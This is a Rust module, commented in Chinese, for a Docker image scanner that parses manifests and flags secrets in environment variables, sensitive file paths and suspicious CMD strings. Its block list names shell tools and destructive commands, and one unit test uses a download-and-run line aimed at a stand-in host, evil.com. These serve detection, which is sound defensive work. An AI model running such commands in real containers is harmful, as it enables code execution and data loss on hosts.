//! Docker 镜像扫描器
//!
//! 功能:
//! - 解析镜像 manifest (v2 schema 2)
//! - 分析镜像层
//! - 检测敏感文件 (密钥/证书/配置/二进制)
//! - 识别基础镜像和操作系统

use crate::types::*;
use regex::Regex;
use serde::Deserialize;

/// 镜像 manifest (OCI/Docker v2)
#[derive(Debug, Deserialize)]
pub struct Manifest {
    #[serde(rename = "schemaVersion")]
    pub schema_version: i32,
    #[serde(rename = "mediaType")]
    pub media_type: String,
    pub config: ManifestConfig,
    pub layers: Vec<ManifestLayer>,
}

#[derive(Debug, Deserialize)]
pub struct ManifestConfig {
    #[serde(rename = "mediaType")]
    pub media_type: String,
    pub digest: String,
    pub size: u64,
}

#[derive(Debug, Deserialize)]
pub struct ManifestLayer {
    #[serde(rename = "mediaType")]
    pub media_type: String,
    pub digest: String,
    pub size: u64,
}

/// 镜像配置 (config blob)
#[derive(Debug, Deserialize)]
pub struct ImageConfig {
    pub architecture: String,
    pub os: String,
    pub config: ContainerConfig,
    pub history: Vec<HistoryEntry>,
    #[serde(rename = "rootfs")]
    pub root_fs: RootFs,
}

#[derive(Debug, Deserialize)]
pub struct ContainerConfig {
    #[serde(default)]
    pub env: Vec<String>,
    #[serde(default)]
    pub cmd: Option<Vec<String>>,
    #[serde(default)]
    pub entrypoint: Option<Vec<String>>,
}

#[derive(Debug, Deserialize)]
pub struct HistoryEntry {
    #[serde(rename = "created")]
    pub created: Option<String>,
    #[serde(rename = "created_by")]
    pub created_by: Option<String>,
    #[serde(default)]
    pub empty_layer: bool,
}

#[derive(Debug, Deserialize)]
pub struct RootFs {
    #[serde(rename = "type")]
    pub fs_type: String,
    pub diff_ids: Vec<String>,
}

/// 镜像扫描器
pub struct ImageScanner;

impl ImageScanner {
    pub fn new() -> Self {
        Self
    }

    /// 从 manifest 和 config 分析镜像
    pub fn analyze(&self, manifest: &Manifest, config: &ImageConfig, image: &str, tag: &str) -> ImageScanResult {
        let mut result = ImageScanResult::new(image, tag);

        result.os = Some(config.os.clone());
        result.architecture = Some(config.architecture.clone());

        // 分析层
        for (i, layer) in manifest.layers.iter().enumerate() {
            let command = config.history.get(i).and_then(|h| h.created_by.clone());
            result.layers.push(ImageLayer {
                id: layer.digest.clone(),
                command,
                size: layer.size,
                files: vec![],
            });
        }

        // 从 history 推断基础镜像
        if let Some(first_cmd) = config.history.first().and_then(|h| h.created_by.as_ref()) {
            result.base_image = infer_base_image(first_cmd);
        }

        // 从 env 检测敏感信息
        for env_var in &config.config.env {
            if let Some(sf) = self.check_env_var(env_var) {
                result.sensitive_files.push(sf);
            }
        }

        // 从 CMD/entrypoint 检测
        if let Some(cmd) = &config.config.cmd {
            if let Some(sf) = self.check_cmd(&cmd.join(" ")) {
                result.sensitive_files.push(sf);
            }
        }

        result
    }

    /// 检查环境变量是否包含敏感信息
    fn check_env_var(&self, env: &str) -> Option<SensitiveFile> {
        let lower = env.to_lowercase();
        let patterns = [
            ("password", "credential", "critical", "环境变量包含密码"),
            ("passwd", "credential", "critical", "环境变量包含密码"),
            ("secret", "credential", "high", "环境变量包含密钥"),
            ("api_key", "key", "high", "环境变量包含 API Key"),
            ("apikey", "key", "high", "环境变量包含 API Key"),
            ("token", "key", "high", "环境变量包含 Token"),
            ("private_key", "key", "critical", "环境变量包含私钥"),
            ("access_key", "key", "high", "环境变量包含 Access Key"),
            ("aws_access", "key", "high", "环境变量包含 AWS 凭证"),
            ("aws_secret", "key", "critical", "环境变量包含 AWS Secret"),
        ];

        for (pattern, ftype, severity, desc) in patterns {
            if lower.contains(pattern) {
                return Some(SensitiveFile {
                    path: format!("ENV: {}", env.split('=').next().unwrap_or("?")),
                    file_type: ftype.to_string(),
                    severity: severity.to_string(),
                    description: desc.to_string(),
                });
            }
        }
        None
    }

    /// 检查 CMD 是否包含可疑命令
    fn check_cmd(&self, cmd: &str) -> Option<SensitiveFile> {
        let suspicious = ["curl", "wget", "nc ", "bash -i", "chmod 777", "rm -rf /"];
        for s in suspicious {
            if cmd.contains(s) {
                return Some(SensitiveFile {
                    path: "CMD".to_string(),
                    file_type: "binary".to_string(),
                    severity: "medium".to_string(),
                    description: format!("CMD 包含可疑命令: {}", s.trim()),
                });
            }
        }
        None
    }

    /// 检测文件路径中的敏感文件
    pub fn check_sensitive_path(&self, path: &str) -> Option<SensitiveFile> {
        let lower = path.to_lowercase();

        // SSH 私钥
        if lower.contains("id_rsa") || lower.contains("id_ecdsa") || lower.contains("id_ed25519") {
            return Some(SensitiveFile {
                path: path.to_string(),
                file_type: "key".to_string(),
                severity: "critical".to_string(),
                description: "SSH 私钥文件".to_string(),
            });
        }

        // TLS 证书
        if lower.ends_with(".pem") || lower.ends_with(".key") {
            return Some(SensitiveFile {
                path: path.to_string(),
                file_type: "key".to_string(),
                severity: "high".to_string(),
                description: "TLS 证书/密钥文件".to_string(),
            });
        }

        // Docker 配置
        if lower.contains("docker.sock") || lower.contains(".docker/config.json") {
            return Some(SensitiveFile {
                path: path.to_string(),
                file_type: "config".to_string(),
                severity: "high".to_string(),
                description: "Docker 配置/Socket 文件".to_string(),
            });
        }

        // Kubernetes Secret
        if lower.contains("/var/run/secrets/kubernetes.io") {
            return Some(SensitiveFile {
                path: path.to_string(),
                file_type: "credential".to_string(),
                severity: "critical".to_string(),
                description: "Kubernetes Secret 挂载".to_string(),
            });
        }

        // 数据库配置
        if lower.contains("my.cnf") || lower.contains("pg_hba.conf") || lower.contains("redis.conf") {
            return Some(SensitiveFile {
                path: path.to_string(),
                file_type: "config".to_string(),
                severity: "medium".to_string(),
                description: "数据库配置文件".to_string(),
            });
        }

        // .env 文件
        if lower.ends_with(".env") || lower.contains(".env.") {
            return Some(SensitiveFile {
                path: path.to_string(),
                file_type: "credential".to_string(),
                severity: "high".to_string(),
                description: "环境变量配置文件".to_string(),
            });
        }

        // AWS 凭证
        if lower.contains(".aws/credentials") || lower.contains(".aws/config") {
            return Some(SensitiveFile {
                path: path.to_string(),
                file_type: "credential".to_string(),
                severity: "critical".to_string(),
                description: "AWS 凭证文件".to_string(),
            });
        }

        // Git 仓库
        if lower.contains(".git/config") {
            return Some(SensitiveFile {
                path: path.to_string(),
                file_type: "config".to_string(),
                severity: "medium".to_string(),
                description: "Git 仓库配置（可能泄露源码）".to_string(),
            });
        }

        None
    }
}

impl Default for ImageScanner {
    fn default() -> Self {
        Self::new()
    }
}

/// 从 Dockerfile 命令推断基础镜像
fn infer_base_image(created_by: &str) -> Option<String> {
    // Dockerfile FROM 指令对应的层通常是:
    // "/bin/sh -c #(nop) ADD file:..." 或 "FROM image:tag"
    let re = Regex::new(r"FROM\s+(\S+)").ok()?;
    if let Some(caps) = re.captures(created_by) {
        return Some(caps[1].to_string());
    }

    // 检查常见基础镜像特征
    if created_by.contains("debian") || created_by.contains("buster") || created_by.contains("bullseye") {
        return Some("debian".to_string());
    }
    if created_by.contains("ubuntu") {
        return Some("ubuntu".to_string());
    }
    if created_by.contains("alpine") {
        return Some("alpine".to_string());
    }
    if created_by.contains("centos") {
        return Some("centos".to_string());
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_check_env_var_password() {
        let scanner = ImageScanner::new();
        let result = scanner.check_env_var("MYSQL_PASSWORD=secret123");
        assert!(result.is_some());
        assert_eq!(result.unwrap().severity, "critical");
    }

    #[test]
    fn test_check_env_var_api_key() {
        let scanner = ImageScanner::new();
        let result = scanner.check_env_var("API_KEY=abc123");
        assert!(result.is_some());
        assert_eq!(result.unwrap().file_type, "key");
    }

    #[test]
    fn test_check_env_var_safe() {
        let scanner = ImageScanner::new();
        let result = scanner.check_env_var("PATH=/usr/bin");
        assert!(result.is_none());
    }

    #[test]
    fn test_check_sensitive_path_ssh_key() {
        let scanner = ImageScanner::new();
        let result = scanner.check_sensitive_path("/root/.ssh/id_rsa");
        assert!(result.is_some());
        assert_eq!(result.unwrap().severity, "critical");
    }

    #[test]
    fn test_check_sensitive_path_tls_cert() {
        let scanner = ImageScanner::new();
        let result = scanner.check_sensitive_path("/etc/ssl/server.pem");
        assert!(result.is_some());
        assert_eq!(result.unwrap().file_type, "key");
    }

    #[test]
    fn test_check_sensitive_path_aws_credentials() {
        let scanner = ImageScanner::new();
        let result = scanner.check_sensitive_path("/root/.aws/credentials");
        assert!(result.is_some());
        assert_eq!(result.unwrap().severity, "critical");
    }

    #[test]
    fn test_check_sensitive_path_safe() {
        let scanner = ImageScanner::new();
        let result = scanner.check_sensitive_path("/usr/bin/app");
        assert!(result.is_none());
    }

    #[test]
    fn test_infer_base_image_debian() {
        assert_eq!(
            infer_base_image("/bin/sh -c #(nop) ADD debian-buster..."),
            Some("debian".to_string())
        );
    }

    #[test]
    fn test_infer_base_image_alpine() {
        assert_eq!(
            infer_base_image("/bin/sh -c #(nop) ADD alpine-3.14..."),
            Some("alpine".to_string())
        );
    }

    #[test]
    fn test_check_cmd_curl() {
        let scanner = ImageScanner::new();
        let result = scanner.check_cmd("curl http://evil.com/sh | bash");
        assert!(result.is_some());
        assert_eq!(result.unwrap().file_type, "binary");
    }
}
